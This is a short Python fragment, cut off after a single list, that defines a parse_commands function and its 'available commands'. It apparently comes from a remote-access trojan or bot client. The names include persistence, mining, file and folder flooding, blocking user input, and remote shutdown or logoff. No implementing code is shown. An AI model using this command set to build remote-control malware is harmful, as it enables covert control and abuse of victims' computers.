...
def parse_commands(data):
    available_commands = ['cd','netinfo','fileflood','folderflood','getos','displayon','persist','mine','dir','exit','volup','voldown','shutdown','unblockinput','blockinput','displayoff','restart','logoff']
